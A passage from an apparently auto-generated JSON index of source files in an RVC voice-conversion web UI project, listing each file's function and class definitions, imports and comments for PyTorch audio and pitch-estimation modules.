          "def forward(self, x: torch.Tensor):",
          "def __init__(",
          "def forward(self, x):",
          "def __init__(self, in_channels, out_channels, n_inters, n_blocks, momentum=0.01):",
          "def forward(self, x):",
          "def __init__(self, in_channels, out_channels, stride, n_blocks=1, momentum=0.01):",
          "def forward(self, x, concat_tensor):",
          "def __init__(self, in_channels, n_decoders, stride, n_blocks, momentum=0.01):",
          "def forward(self, x: torch.Tensor, concat_tensors: List[torch.Tensor]):",
          "def __init__(",
          "def forward(self, x: torch.Tensor) -> torch.Tensor:",
          "def __init__(",
          "def forward(self, mel):",
          "def __init__(",
          "def forward(self, audio, keyshift=0, speed=1, center=True):",
          "def __init__(self, model_path: str, is_half, device=None, use_jit=False):",
          "def get_jit_model():",
          "def get_default_model():",
          "def mel2hidden(self, mel):",
          "def decode(self, hidden, thred=0.03):",
          "def infer_from_audio(self, audio, thred=0.03):",
          "def to_local_average_cents(self, salience, thred=0.05):"
        ],
        "class_defs": [
          "class STFT(torch.nn.Module):",
          "class BiGRU(nn.Module):",
          "class ConvBlockRes(nn.Module):",
          "class Encoder(nn.Module):",
          "class ResEncoderBlock(nn.Module):",
          "class Intermediate(nn.Module):  #",
          "class ResDecoderBlock(nn.Module):",
          "class Decoder(nn.Module):",
          "class DeepUnet(nn.Module):",
          "class E2E(nn.Module):",
          "class MelSpectrogram(torch.nn.Module):",
          "class RMVPE:"
        ],
        "imports": [
          "from io import BytesIO",
          "import os",
          "from typing import List, Optional, Tuple",
          "import numpy as np",
          "import torch",
          "from infer.lib import jit",
          "import intel_extension_for_pytorch as ipex  # pylint: disable=import-error, unused-import",
          "from infer.modules.ipex import ipex_init",
          "import torch.nn as nn",
          "import torch.nn.functional as F",
          "from librosa.util import normalize, pad_center, tiny",
          "from scipy.signal import get_window",
          "import logging",
          "from time import time as ttime",
          "from librosa.filters import mel",
          "import onnxruntime as ort",
          "import librosa",
          "import soundfile as sf"
        ],
        "comments": [
          "# Fix \"Torch not compiled with CUDA enabled\"",
          "# get window and zero center pad it to filter_length",
          "# window the bases",
          "# self.shortcut:Optional[nn.Module] = None",
          "# print(mel.shape)",
          "# print(x.shape)",
          "# f0 = np.array([10 * (2 ** (cent_pred / 1200)) if cent_pred else 0 for cent_pred in cents_pred])",
          "# torch.cuda.synchronize()",
          "# t0 = ttime()",
          "# print(123123123,mel.device.type)",
          "# torch.cuda.synchronize()",
          "# t1 = ttime()",
          "# torch.cuda.synchronize()",
          "# t2 = ttime()",
          "# print(234234,hidden.device.type)",
          "# torch.cuda.synchronize()",
          "# t3 = ttime()",
          "# print(\"hmvpe:%s\\t%s\\t%s\\t%s\"%(t1-t0,t2-t1,t3-t2,t3-t0))",
          "# t0 = ttime()",
          "# t1 = ttime()",
          "# t2 = ttime()",
          "# t3 = ttime()",
          "# t4 = ttime()",
          "# print(\"decode:%s\\t%s\\t%s\\t%s\" % (t1 - t0, t2 - t1, t3 - t2, t4 - t3))",
          "# f0 = rmvpe.infer_from_audio(audio, thred=thred)",
          "# f0 = rmvpe.infer_from_audio(audio, thred=thred)",
          "# f0 = rmvpe.infer_from_audio(audio, thred=thred)",
          "# f0 = rmvpe.infer_from_audio(audio, thred=thred)"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/audio.py",
        "docstrings": [],
        "function_defs": [
          "def wav2(i, o, format):",
          "def load_audio(file, sr):",
          "def clean_path(path_str):"
        ],
        "class_defs": [],
        "imports": [
          "import platform, os",
          "import ffmpeg",
          "import numpy as np",
          "import av",
          "from io import BytesIO",
          "import traceback",
          "import re"
        ],
        "comments": [
          "# https://github.com/openai/whisper/blob/main/whisper/audio.py#L26",
          "# This launches a subprocess to decode audio while down-mixing and resampling as necessary.",
          "# Requires the ffmpeg CLI and `ffmpeg-python` package to be installed."
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 4,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/rtrvc.py",
        "docstrings": [],
        "function_defs": [
          "def printt(strr, *args):",
          "def __init__(",
          "def forward_dml(ctx, x, scale):",
          "def set_default_model():",
          "def set_jit_model():",
          "def set_synthesizer():",
          "def change_key(self, new_key):",
          "def change_formant(self, new_formant):",
          "def change_index_rate(self, new_index_rate):",
          "def get_f0_post(self, f0):",
          "def get_f0(self, x, f0_up_key, n_cpu, method=\"harvest\"):",
          "def get_f0_crepe(self, x, f0_up_key):",
          "def get_f0_rmvpe(self, x, f0_up_key):",
          "def get_f0_fcpe(self, x, f0_up_key):",
          "def infer("
        ],
        "class_defs": [
          "class RVC:"
        ],
        "imports": [
          "from io import BytesIO",
          "import os",
          "import sys",
          "import traceback",
          "from infer.lib import jit",
          "from infer.lib.jit.get_synthesizer import get_synthesizer",
          "from time import time as ttime",
          "import fairseq",
          "import faiss",
          "import numpy as np",
          "import parselmouth",
          "import pyworld",
          "import scipy.signal as signal",
          "import torch",
          "import torch.nn as nn",
          "import torch.nn.functional as F",
          "import torchcrepe",
          "from torchaudio.transforms import Resample",
          "from multiprocessing import Manager as M",
          "from configs.config import Config",
          "from infer.lib.rmvpe import RMVPE",
          "from torchfcpe import spawn_bundled_infer_model"
        ],
        "comments": [
          "# config = Config()",
          "# config.device=torch.device(\"cpu\")########\u5f3a\u5236cpu\u6d4b\u8bd5",
          "# config.is_half=False########\u5f3a\u5236cpu\u6d4b\u8bd5",
          "# global config",
          "# device=\"cpu\"########\u5f3a\u5236cpu\u6d4b\u8bd5",
          "# printt(\"using crepe,device:%s\"%self.device)",
          "# device=self.device if self.device.type!=\"privateuseone\" else \"cpu\",###crepe\u4e0d\u7528\u534a\u7cbe\u5ea6\u5168\u90e8\u662f\u5168\u7cbe\u5ea6\u6240\u4ee5\u4e0d\u6101###cpu\u5ef6\u8fdf\u9ad8\u5230\u6ca1\u6cd5\u7528"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 1,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/infer_pack/transforms.py",
        "docstrings": [],
        "function_defs": [
          "def piecewise_rational_quadratic_transform(",
          "def searchsorted(bin_locations, inputs, eps=1e-6):",
          "def unconstrained_rational_quadratic_spline(",
          "def rational_quadratic_spline("
        ],
        "class_defs": [],
        "imports": [
          "import numpy as np",
          "import torch",
          "from torch.nn import functional as F"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 4,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/infer_pack/models.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def forward(",
          "def __init__(",
          "def forward(",
          "def remove_weight_norm(self):",
          "def __prepare_scriptable__(self):",
          "def __init__(",
          "def forward(",
          "def remove_weight_norm(self):",
          "def __prepare_scriptable__(self):",
          "def __init__(",
          "def forward(",
          "def __prepare_scriptable__(self):",
          "def remove_weight_norm(self):",
          "def __init__(",
          "def _f02uv(self, f0):",
          "def _f02sine(self, f0, upp):\n\"\"\" f0: (batchsize, length, dim)\nwhere dim indicates fundamental tone and overtones\n\"\"\"",
          "def forward(self, f0: torch.Tensor, upp: int):\n\"\"\"sine_tensor, uv = forward(f0)\ninput F0: tensor(batchsize=1, length, dim=1)\nf0 for unvoiced steps should be 0\noutput sine_tensor: tensor(batchsize=1, length, dim)\noutput uv: tensor(batchsize=1, length, 1)\n\"\"\"",
          "def __init__(",
          "def forward(self, x: torch.Tensor, upp: int = 1):",
          "def __init__(",
          "def forward(",
          "def remove_weight_norm(self):",
          "def __prepare_scriptable__(self):",
          "def __init__(",
          "def remove_weight_norm(self):",
          "def __prepare_scriptable__(self):",
          "def forward(",
          "def infer(",
          "def __init__(",
          "def __init__(",
          "def remove_weight_norm(self):",
          "def __prepare_scriptable__(self):",
          "def forward(self, phone, phone_lengths, y, y_lengths, ds):  # \u8fd9\u91ccds\u662fid\uff0c[bs,1]",
          "def infer(",
          "def __init__(",
          "def __init__(self, use_spectral_norm=False):",
          "def forward(self, y, y_hat):",
          "def __init__(self, use_spectral_norm=False):",
          "def forward(self, y, y_hat):",
          "def __init__(self, use_spectral_norm=False):",
          "def forward(self, x):",
          "def __init__(self, period, kernel_size=5, stride=3, use_spectral_norm=False):",
          "def forward(self, x):"
        ],
        "class_defs": [
          "class TextEncoder(nn.Module):",
          "class ResidualCouplingBlock(nn.Module):",
          "class PosteriorEncoder(nn.Module):",
          "class Generator(torch.nn.Module):",
          "class SineGen(torch.nn.Module):",
          "class SourceModuleHnNSF(torch.nn.Module):",
          "class GeneratorNSF(torch.nn.Module):",
          "class SynthesizerTrnMs256NSFsid(nn.Module):",
          "class SynthesizerTrnMs768NSFsid(SynthesizerTrnMs256NSFsid):",
          "class SynthesizerTrnMs256NSFsid_nono(nn.Module):",
          "class SynthesizerTrnMs768NSFsid_nono(SynthesizerTrnMs256NSFsid_nono):",
          "class MultiPeriodDiscriminator(torch.nn.Module):",
          "class MultiPeriodDiscriminatorV2(torch.nn.Module):",
          "class DiscriminatorS(torch.nn.Module):",
          "class DiscriminatorP(torch.nn.Module):"
        ],
        "imports": [
          "import math",
          "import logging",
          "from typing import Optional",
          "import numpy as np",
          "import torch",
          "from torch import nn",
          "from torch.nn import AvgPool1d, Conv1d, Conv2d, ConvTranspose1d",
          "from torch.nn import functional as F",
          "from torch.nn.utils import remove_weight_norm, spectral_norm, weight_norm",
          "from infer.lib.infer_pack import attentions, commons, modules",
          "from infer.lib.infer_pack.commons import get_padding, init_weights"
        ],
        "comments": [
          "# The hook we want to remove is an instance of WeightNorm class, so",
          "# normally we would do `if isinstance(...)` but this class is not accessible",
          "# because of shadowing, so we check the module name directly.",
          "# https://github.com/pytorch/pytorch/blob/be0ca00c5ce260eb5bcec3237357f7a30cc08983/torch/nn/utils/__init__.py#L3",
          "# generate uv signal",
          "# to produce sine waveforms",
          "# to merge source harmonics into a single excitation",
          "# self.ddtype:int = -1",
          "# if self.ddtype ==-1:",
          "#     self.ddtype = self.l_linear.weight.dtype",
          "# print(x.dtype,sine_wavs.dtype,self.l_linear.weight.dtype)",
          "# if self.is_half:",
          "#     sine_wavs = sine_wavs.half()",
          "# sine_merge = self.l_tanh(self.l_linear(sine_wavs.to(x)))",
          "# print(sine_wavs.dtype,self.ddtype)",
          "# if sine_wavs.dtype != self.l_linear.weight.dtype:",
          "# torch.jit.script() does not support direct indexing of torch modules",
          "# That's why I wrote this",
          "# This assertion cannot be ignored! \\",
          "# If ignored, it will cause torch.jit.script() compilation errors",
          "# The hook we want to remove is an instance of WeightNorm class, so",
          "# normally we would do `if isinstance(...)` but this class is not accessible",
          "# because of shadowing, so we check the module name directly.",
          "# https://github.com/pytorch/pytorch/blob/be0ca00c5ce260eb5bcec3237357f7a30cc08983/torch/nn/utils/__init__.py#L3",
          "# self.hop_length = hop_length#",
          "# The hook we want to remove is an instance of WeightNorm class, so",
          "# normally we would do `if isinstance(...)` but this class is not accessible",
          "# because of shadowing, so we check the module name directly.",
          "# https://github.com/pytorch/pytorch/blob/be0ca00c5ce260eb5bcec3237357f7a30cc08983/torch/nn/utils/__init__.py#L3",
          "# print(1,pitch.shape)#[bs,t]",
          "# print(-1,pitchf.shape,ids_slice,self.segment_size,self.hop_length,self.segment_size//self.hop_length)",
          "# print(-2,pitchf.shape,z_slice.shape)",
          "# self.hop_length = hop_length#",
          "# The hook we want to remove is an instance of WeightNorm class, so",
          "# normally we would do `if isinstance(...)` but this class is not accessible",
          "# because of shadowing, so we check the module name directly.",
          "# https://github.com/pytorch/pytorch/blob/be0ca00c5ce260eb5bcec3237357f7a30cc08983/torch/nn/utils/__init__.py#L3",
          "# periods = [3, 5, 7, 11, 17, 23, 37]",
          "# for j in range(len(fmap_r)):",
          "#     print(i,j,y.shape,y_hat.shape,fmap_r[j].shape,fmap_g[j].shape)",
          "# periods = [2, 3, 5, 7, 11, 17]",
          "# for j in range(len(fmap_r)):",
          "#     print(i,j,y.shape,y_hat.shape,fmap_r[j].shape,fmap_g[j].shape)",
          "# 1d to 2d"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 0,
        "decorators": [
          "@torch.jit.ignore",
          "@torch.jit.export",
          "@torch.jit.ignore",
          "@torch.jit.export"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/infer_pack/models_onnx.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def forward(self, phone, pitch, lengths):",
          "def __init__(",
          "def forward(self, phone, pitch, lengths):",
          "def __init__(",
          "def forward(self, x, x_mask, g=None, reverse=False):",
          "def remove_weight_norm(self):",
          "def __init__(",
          "def forward(self, x, x_lengths, g=None):",
          "def remove_weight_norm(self):",
          "def __init__(",
          "def forward(self, x, g=None):",
          "def remove_weight_norm(self):",
          "def __init__(",
          "def _f02uv(self, f0):",
          "def _f02sine(self, f0, upp):\n\"\"\" f0: (batchsize, length, dim)\nwhere dim indicates fundamental tone and overtones\n\"\"\"",
          "def forward(self, f0: torch.Tensor, upp: int):\n\"\"\"sine_tensor, uv = forward(f0)\ninput F0: tensor(batchsize=1, length, dim=1)\nf0 for unvoiced steps should be 0\noutput sine_tensor: tensor(batchsize=1, length, dim)\noutput uv: tensor(batchsize=1, length, 1)\n\"\"\"",
          "def __init__(",
          "def forward(self, x, upp=None):",
          "def __init__(",
          "def forward(self, x, f0, g=None):",
          "def remove_weight_norm(self):",
          "def __init__(",
          "def remove_weight_norm(self):",
          "def construct_spkmixmap(self, n_speaker):",
          "def forward(self, phone, phone_lengths, pitch, nsff0, g, rnd, max_len=None):",
          "def __init__(self, use_spectral_norm=False):",
          "def forward(self, y, y_hat):",
          "def __init__(self, use_spectral_norm=False):",
          "def forward(self, y, y_hat):",
          "def __init__(self, use_spectral_norm=False):",
          "def forward(self, x):",
          "def __init__(self, period, kernel_size=5, stride=3, use_spectral_norm=False):",
          "def forward(self, x):"
        ],
        "class_defs": [
          "class TextEncoder256(nn.Module):",
          "class TextEncoder768(nn.Module):",
          "class ResidualCouplingBlock(nn.Module):",
          "class PosteriorEncoder(nn.Module):",
          "class Generator(torch.nn.Module):",
          "class SineGen(torch.nn.Module):",
          "class SourceModuleHnNSF(torch.nn.Module):",
          "class GeneratorNSF(torch.nn.Module):",
          "class SynthesizerTrnMsNSFsidM(nn.Module):",
          "class MultiPeriodDiscriminator(torch.nn.Module):",
          "class MultiPeriodDiscriminatorV2(torch.nn.Module):",
          "class DiscriminatorS(torch.nn.Module):",
          "class DiscriminatorP(torch.nn.Module):"
        ],
        "imports": [
          "import math",
          "import logging",
          "import numpy as np",
          "import torch",
          "from torch import nn",
          "from torch.nn import AvgPool1d, Conv1d, Conv2d, ConvTranspose1d",
          "from torch.nn import functional as F",
          "from torch.nn.utils import remove_weight_norm, spectral_norm, weight_norm",
          "from infer.lib.infer_pack import commons, modules",
          "import infer.lib.infer_pack.attentions_onnx as attentions",
          "from infer.lib.infer_pack.commons import get_padding, init_weights"
        ],
        "comments": [
          "############################## Warning! ##############################",
          "#                                                                    #",
          "#           Onnx Export Not Support All Of Non-Torch Types           #",
          "#           Include Python Built-in Types!!!!!!!!!!!!!!!!!           #",
          "#                   If You Want TO Change This File                  #",
          "#                  Do Not Use All Of Non-Torch Types!                #",
          "#                                                                    #",
          "############################## Warning! ##############################",
          "# generate uv signal",
          "# to produce sine waveforms",
          "# to merge source harmonics into a single excitation",
          "# self.hop_length = hop_length#",
          "# periods = [3, 5, 7, 11, 17, 23, 37]",
          "# for j in range(len(fmap_r)):",
          "#     print(i,j,y.shape,y_hat.shape,fmap_r[j].shape,fmap_g[j].shape)",
          "# periods = [2, 3, 5, 7, 11, 17]",
          "# for j in range(len(fmap_r)):",
          "#     print(i,j,y.shape,y_hat.shape,fmap_r[j].shape,fmap_g[j].shape)",
          "# 1d to 2d"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/infer_pack/attentions.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def forward(self, x, x_mask):",
          "def __init__(",
          "def forward(self, x, x_mask, h, h_mask):\n\"\"\"\nx: decoder input\nh: encoder output\n\"\"\"",
          "def __init__(",
          "def forward(",
          "def attention(",
          "def _matmul_with_relative_values(self, x, y):\n\"\"\"\nx: [b, h, l, m]\ny: [h or 1, m, d]\nret: [b, h, l, d]\n\"\"\"",
          "def _matmul_with_relative_keys(self, x, y):\n\"\"\"\nx: [b, h, l, d]\ny: [h or 1, m, d]\nret: [b, h, l, m]\n\"\"\"",
          "def _get_relative_embeddings(self, relative_embeddings, length: int):",
          "def _relative_position_to_absolute_position(self, x):\n\"\"\"\nx: [b, h, l, 2*l-1]\nret: [b, h, l, l]\n\"\"\"",
          "def _absolute_position_to_relative_position(self, x):\n\"\"\"\nx: [b, h, l, l]\nret: [b, h, l, 2*l-1]\n\"\"\"",
          "def _attention_bias_proximal(self, length: int):\n\"\"\"Bias for self-attention to encourage attention to close positions.\nArgs:\nlength: an integer scalar.\nReturns:\na Tensor with shape [1, 1, length, length]\n\"\"\"",
          "def __init__(",
          "def padding(self, x: torch.Tensor, x_mask: torch.Tensor) -> torch.Tensor:",
          "def forward(self, x: torch.Tensor, x_mask: torch.Tensor):",
          "def _causal_padding(self, x):",
          "def _same_padding(self, x):"
        ],
        "class_defs": [
          "class Encoder(nn.Module):",
          "class Decoder(nn.Module):",
          "class MultiHeadAttention(nn.Module):",
          "class FFN(nn.Module):"
        ],
        "imports": [
          "import copy",
          "import math",
          "from typing import Optional",
          "import numpy as np",
          "import torch",
          "from torch import nn",
          "from torch.nn import functional as F",
          "from infer.lib.infer_pack import commons, modules",
          "from infer.lib.infer_pack.modules import LayerNorm"
        ],
        "comments": [
          "# reshape [b, d, t] -> [b, n_h, t, d_k]",
          "# Pad first before slice to avoid using cond ops.",
          "# commons.convert_pad_shape([[0, 0], [pad_length, pad_length], [0, 0]]),",
          "# Concat columns of pad to shift from relative to absolute indexing.",
          "#   commons.convert_pad_shape([[0, 0], [0, 0], [0, 0], [0, 1]])",
          "# Concat extra elements so to add up to shape (len+1, 2*len-1).",
          "# commons.convert_pad_shape([[0, 0], [0, 0], [0, int(length) - 1]])",
          "# Reshape and slice out the padded elements.",
          "# padd along column",
          "# commons.convert_pad_shape([[0, 0], [0, 0], [0, 0], [0, int(length) - 1]])",
          "# add 0's in the beginning that will skew the elements after reshape",
          "#    commons.convert_pad_shape([[0, 0], [0, 0], [int(length), 0]])",
          "# if causal:",
          "#     self.padding = self._causal_padding",
          "# else:",
          "#     self.padding = self._same_padding",
          "# padding = [[0, 0], [0, 0], [pad_l, pad_r]]",
          "#   commons.convert_pad_shape(padding)",
          "# padding = [[0, 0], [0, 0], [pad_l, pad_r]]",
          "#   commons.convert_pad_shape(padding)"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/infer_pack/commons.py",
        "docstrings": [],
        "function_defs": [
          "def init_weights(m, mean=0.0, std=0.01):",
          "def get_padding(kernel_size, dilation=1):",
          "def kl_divergence(m_p, logs_p, m_q, logs_q):\n\"\"\"KL(P||Q)\"\"\"\nkl = (logs_q - logs_p) - 0.5\nkl += (\n0.5 * (torch.exp(2.0 * logs_p) + ((m_p - m_q) ** 2)) * torch.exp(-2.0 * logs_q)\n)\nreturn kl\n\n\ndef rand_gumbel(shape):",
          "def rand_gumbel(shape):\n\"\"\"Sample from the Gumbel distribution, protect from overflows.\"\"\"\nuniform_samples = torch.rand(shape) * 0.99998 + 0.00001\nreturn -torch.log(-torch.log(uniform_samples))\n\n\ndef rand_gumbel_like(x):\ng = rand_gumbel(x.size()).to(dtype=x.dtype, device=x.device)\nreturn g\n",
          "def rand_gumbel_like(x):",
          "def slice_segments(x, ids_str, segment_size=4):",
          "def slice_segments2(x, ids_str, segment_size=4):",
          "def rand_slice_segments(x, x_lengths=None, segment_size=4):",
          "def get_timing_signal_1d(length, channels, min_timescale=1.0, max_timescale=1.0e4):",
          "def add_timing_signal_1d(x, min_timescale=1.0, max_timescale=1.0e4):",
          "def cat_timing_signal_1d(x, min_timescale=1.0, max_timescale=1.0e4, axis=1):",
          "def subsequent_mask(length):",
          "def fused_add_tanh_sigmoid_multiply(input_a, input_b, n_channels):",
          "def convert_pad_shape(pad_shape: List[List[int]]) -> List[int]:",
          "def shift_1d(x):",
          "def sequence_mask(length: torch.Tensor, max_length: Optional[int] = None):",
          "def generate_path(duration, mask):\n\"\"\"\nduration: [b, 1, t_x]\nmask: [b, 1, t_y, t_x]\n\"\"\"",
          "def clip_grad_value_(parameters, clip_value, norm_type=2):"
        ],
        "class_defs": [],
        "imports": [
          "from typing import List, Optional",
          "import math",
          "import numpy as np",
          "import torch",
          "from torch import nn",
          "from torch.nn import functional as F"
        ],
        "comments": [
          "# def convert_pad_shape(pad_shape):",
          "#     l = pad_shape[::-1]",
          "#     pad_shape = [item for sublist in l for item in sublist]",
          "#     return pad_shape",
          "# def convert_pad_shape(pad_shape):",
          "#     l = pad_shape[::-1]",
          "#     pad_shape = [item for sublist in l for item in sublist]",
          "#     return pad_shape"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 2,
        "error_handling": 0,
        "decorators": [
          "@torch.jit.script"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/infer_pack/modules.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, channels, eps=1e-5):",
          "def forward(self, x):",
          "def __init__(",
          "def forward(self, x, x_mask):",
          "def __init__(self, channels, kernel_size, n_layers, p_dropout=0.0):",
          "def forward(self, x, x_mask, g: Optional[torch.Tensor] = None):",
          "def __init__(",
          "def forward(",
          "def remove_weight_norm(self):",
          "def __prepare_scriptable__(self):",
          "def __init__(self, channels, kernel_size=3, dilation=(1, 3, 5)):",
          "def forward(self, x: torch.Tensor, x_mask: Optional[torch.Tensor] = None):",
          "def remove_weight_norm(self):",
          "def __prepare_scriptable__(self):",
          "def __init__(self, channels, kernel_size=3, dilation=(1, 3)):",
          "def forward(self, x, x_mask: Optional[torch.Tensor] = None):",
          "def remove_weight_norm(self):",
          "def __prepare_scriptable__(self):",
          "def forward(",
          "def forward(",
          "def __init__(self, channels):",
          "def forward(self, x, x_mask, reverse=False, **kwargs):",
          "def __init__(",
          "def forward(",
          "def remove_weight_norm(self):",
          "def __prepare_scriptable__(self):",
          "def __init__(",
          "def forward("
        ],
        "class_defs": [
          "class LayerNorm(nn.Module):",
          "class ConvReluNorm(nn.Module):",
          "class DDSConv(nn.Module):",
          "class WN(torch.nn.Module):",
          "class ResBlock1(torch.nn.Module):",
          "class ResBlock2(torch.nn.Module):",
          "class Log(nn.Module):",
          "class Flip(nn.Module):",
          "class ElementwiseAffine(nn.Module):",
          "class ResidualCouplingLayer(nn.Module):",
          "class ConvFlow(nn.Module):"
        ],
        "imports": [
          "import copy",
          "import math",
          "from typing import Optional, Tuple",
          "import numpy as np",
          "import scipy",
          "import torch",
          "from torch import nn",
          "from torch.nn import AvgPool1d, Conv1d, Conv2d, ConvTranspose1d",
          "from torch.nn import functional as F",
          "from torch.nn.utils import remove_weight_norm, weight_norm",
          "from infer.lib.infer_pack import commons",
          "from infer.lib.infer_pack.commons import get_padding, init_weights",
          "from infer.lib.infer_pack.transforms import piecewise_rational_quadratic_transform"
        ],
        "comments": [
          "# last one is not necessary",
          "# torch.jit.script() Compiled functions \\",
          "# can't take variable number of arguments or \\",
          "# use keyword-only arguments with defaults"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/infer_pack/attentions_onnx.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def forward(self, x, x_mask):",
          "def __init__(",
          "def forward(self, x, x_mask, h, h_mask):\n\"\"\"\nx: decoder input\nh: encoder output\n\"\"\"",
          "def __init__(",
          "def forward(",
          "def attention(",
          "def _matmul_with_relative_values(self, x, y):\n\"\"\"\nx: [b, h, l, m]\ny: [h or 1, m, d]\nret: [b, h, l, d]\n\"\"\"",
          "def _matmul_with_relative_keys(self, x, y):\n\"\"\"\nx: [b, h, l, d]\ny: [h or 1, m, d]\nret: [b, h, l, m]\n\"\"\"",
          "def _get_relative_embeddings(self, relative_embeddings, length):",
          "def _relative_position_to_absolute_position(self, x):\n\"\"\"\nx: [b, h, l, 2*l-1]\nret: [b, h, l, l]\n\"\"\"",
          "def _absolute_position_to_relative_position(self, x):\n\"\"\"\nx: [b, h, l, l]\nret: [b, h, l, 2*l-1]\n\"\"\"",
          "def _attention_bias_proximal(self, length):\n\"\"\"Bias for self-attention to encourage attention to close positions.\nArgs:\nlength: an integer scalar.\nReturns:\na Tensor with shape [1, 1, length, length]\n\"\"\"",
          "def __init__(",
          "def padding(self, x: torch.Tensor, x_mask: torch.Tensor) -> torch.Tensor:",
          "def forward(self, x: torch.Tensor, x_mask: torch.Tensor):",
          "def _causal_padding(self, x):",
          "def _same_padding(self, x):"
        ],
        "class_defs": [
          "class Encoder(nn.Module):",
          "class Decoder(nn.Module):",
          "class MultiHeadAttention(nn.Module):",
          "class FFN(nn.Module):"
        ],
        "imports": [
          "import copy",
          "import math",
          "from typing import Optional",
          "import numpy as np",
          "import torch",
          "from torch import nn",
          "from torch.nn import functional as F",
          "from infer.lib.infer_pack import commons, modules",
          "from infer.lib.infer_pack.modules import LayerNorm"
        ],
        "comments": [
          "############################## Warning! ##############################",
          "#                                                                    #",
          "#           Onnx Export Not Support All Of Non-Torch Types           #",
          "#           Include Python Built-in Types!!!!!!!!!!!!!!!!!           #",
          "#                   If You Want TO Change This File                  #",
          "#                  Do Not Use All Of Non-Torch Types!                #",
          "#                                                                    #",
          "############################## Warning! ##############################",
          "# reshape [b, d, t] -> [b, n_h, t, d_k]",
          "# Pad first before slice to avoid using cond ops.",
          "# commons.convert_pad_shape([[0, 0], [pad_length, pad_length], [0, 0]]),",
          "# Concat columns of pad to shift from relative to absolute indexing.",
          "#   commons.convert_pad_shape([[0, 0], [0, 0], [0, 0], [0, 1]])",
          "# Concat extra elements so to add up to shape (len+1, 2*len-1).",
          "# Reshape and slice out the padded elements.",
          "# padd along column",
          "# add 0's in the beginning that will skew the elements after reshape",
          "# if causal:",
          "#     self.padding = self._causal_padding",
          "# else:",
          "#     self.padding = self._same_padding",
          "# padding = [[0, 0], [0, 0], [pad_l, pad_r]]",
          "#   commons.convert_pad_shape(padding)",
          "# padding = [[0, 0], [0, 0], [pad_l, pad_r]]",
          "#   commons.convert_pad_shape(padding)"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/infer_pack/onnx_inference.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, vec_path=\"pretrained/vec-768-layer-12.onnx\", device=None):",
          "def __call__(self, wav):",
          "def forward(self, wav):",
          "def get_f0_predictor(f0_predictor, hop_length, sampling_rate, **kargs):",
          "def __init__(",
          "def forward(self, hubert, hubert_length, pitch, pitchf, ds, rnd):",
          "def inference("
        ],
        "class_defs": [
          "class ContentVec:",
          "class OnnxRVC:"
        ],
        "imports": [
          "import librosa",
          "import numpy as np",
          "import onnxruntime",
          "import soundfile",
          "import logging",
          "from lib.infer_pack.modules.F0Predictor.PMF0Predictor import PMF0Predictor",
          "from lib.infer_pack.modules.F0Predictor.HarvestF0Predictor import (",
          "from lib.infer_pack.modules.F0Predictor.DioF0Predictor import DioF0Predictor"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 4,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/jit/get_hubert.py",
        "docstrings": [],
        "function_defs": [
          "def pad_to_multiple(x, multiple, dim=-1, value=0):",
          "def extract_features(",
          "def undo_pad(a, b, c):",
          "def compute_mask_indices(",
          "def arrange(s, e, length, keep_length):",
          "def apply_mask(self, x, padding_mask, target_list):",
          "def get_hubert_model(",
          "def _apply_mask(x, padding_mask, target_list):",
          "def _extract_features(",
          "def hubert_extract_features(",
          "def _hubert_extract_features(",
          "def infer(source, padding_mask, output_layer: torch.Tensor):"
        ],
        "class_defs": [],
        "imports": [
          "import math",
          "import random",
          "from typing import Optional, Tuple",
          "from fairseq.checkpoint_utils import load_model_ensemble_and_task",
          "import numpy as np",
          "import torch",
          "import torch.nn.functional as F",
          "from fairseq.utils import index_put"
        ],
        "comments": [
          "# from fairseq.data.data_utils import compute_mask_indices",
          "# @torch.jit.script",
          "# Inspired from https://github.com/lucidrains/local-attention/blob/master/local_attention/local_attention.py#L41",
          "# pad to the sequence length dimension",
          "# B x T x C -> T x B x C",
          "# T x B x C -> B x T x C",
          "# undo paddding",
          "# add a random number for probabilistic rounding",
          "# hubert_model.forward=infer",
          "# hubert_model.forward"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 7,
        "error_handling": 1,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/jit/__init__.py",
        "docstrings": [],
        "function_defs": [
          "def load_inputs(path, device, is_half=False):",
